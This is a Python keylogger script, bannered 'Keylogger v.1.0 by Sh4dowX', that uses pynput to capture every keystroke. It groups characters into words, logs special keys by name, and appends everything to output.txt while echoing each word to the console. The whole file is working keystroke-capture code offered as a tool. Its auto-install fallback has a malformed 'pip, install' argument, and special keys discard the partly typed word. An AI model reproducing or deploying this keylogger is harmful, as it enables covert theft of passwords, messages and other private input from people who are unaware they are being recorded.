try:
    from pynput import keyboard 
    from colorama import Fore, Style
    
    # Colorama colors
    GREEN = Fore.GREEN
    RED = Fore.RED
    BLUE = Fore.BLUE
    YELLOW = Fore.YELLOW
    RESET = Style.RESET_ALL
except ImportError:
    print("Some required modules are not installed. Installing them now...")

    try:
        import subprocess

        # Install pynput
        subprocess.call(['pip', 'install', 'pynput'])

        # Install colorama
        subprocess.call(['pip, install', 'colorama'])

        # Import the modules again
        from pynput import keyboard
        from colorama import Fore, Style

        print("Modules installed successfully.")
    except Exception as e:
        print(f"Error installing modules: {e}")
        exit(1)

# Display a banner
print(f"""{RED}
················································
: _  __          _                             :
:| |/ /___ _   _| | ___   __ _  __ _  ___ _ __ :
:| ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|:
:| . \  __/ |_| | | (_) | (_| | (_| |  __/ |   :
:|_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|   :
:          |___/         |___/ |___/           :
················································ v.1.0{RESET}          {BLUE}by Sh4dowX{RESET}
""")

# Each captured word is reset to this variable
word = ""

# Define the function to be called when a key is pressed
def on_press(key):
    global word
    
    # Check for the Esc key to exit the program
    if key == keyboard.Key.esc:
        return False
    
    # Check for space or enter key to save the word
    if key == keyboard.Key.space or key == keyboard.Key.enter: 
        save_word()
    # Check for special keys and handle accordingly
    elif key == keyboard.Key.up or \
        key == keyboard.Key.alt or \
        key == keyboard.Key.alt_gr or \
        key == keyboard.Key.alt_l or \
        key == keyboard.Key.alt_r or \
        key == keyboard.Key.backspace or \
        key == keyboard.Key.caps_lock or \
        key == keyboard.Key.cmd or \
        key == keyboard.Key.cmd_l or \
        key == keyboard.Key.cmd_r or \
        key == keyboard.Key.ctrl or \
        key == keyboard.Key.ctrl_l or \
        key == keyboard.Key.ctrl_r or \
        key == keyboard.Key.delete or \
        key == keyboard.Key.down or \
        key == keyboard.Key.end or \
        key == keyboard.Key.f1 or \
        key == keyboard.Key.f2 or \
        key == keyboard.Key.f3 or \
        key == keyboard.Key.f4 or \
        key == keyboard.Key.f5 or \
        key == keyboard.Key.f6 or \
        key == keyboard.Key.f7 or \
        key == keyboard.Key.f8 or \
        key == keyboard.Key.f9 or \
        key == keyboard.Key.f10 or \
        key == keyboard.Key.f11 or \
        key == keyboard.Key.f12 or \
        key == keyboard.Key.f13 or \
        key == keyboard.Key.f14 or \
        key == keyboard.Key.f15 or \
        key == keyboard.Key.f16 or \
        key == keyboard.Key.f17 or \
        key == keyboard.Key.f18 or \
        key == keyboard.Key.f19 or \
        key == keyboard.Key.f20 or \
        key == keyboard.Key.f21 or \
        key == keyboard.Key.f22 or \
        key == keyboard.Key.f23 or \
        key == keyboard.Key.f24 or \
        key == keyboard.Key.home or \
        key == keyboard.Key.insert or \
        key == keyboard.Key.left or \
        key == keyboard.Key.media_next or \
        key == keyboard.Key.media_play_pause or \
        key == keyboard.Key.media_previous or \
        key == keyboard.Key.media_volume_down or \
        key == keyboard.Key.media_volume_up or \
        key == keyboard.Key.media_volume_mute or \
        key == keyboard.Key.menu or \
        key == keyboard.Key.num_lock or \
        key == keyboard.Key.page_down or \
        key == keyboard.Key.page_up or \
        key == keyboard.Key.pause or \
        key == keyboard.Key.print_screen or \
        key == keyboard.Key.right or \
        key == keyboard.Key.scroll_lock or \
        key == keyboard.Key.shift or \
        key == keyboard.Key.shift_l or \
        key == keyboard.Key.shift_r or \
        key == keyboard.Key.tab or \
        key == keyboard.Key.up:
        word = str(key)
        save_word()
    else:
        word += key.char

# Function to save the word to a file
def save_word():
    with open("output.txt", "a") as file:
        file.write(word + "\n")
    
    print(f"Registered word: {GREEN}{word}{RESET}")
    reset_word()

# Function to reset the word variable
def reset_word():
    global word
    word = ""

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
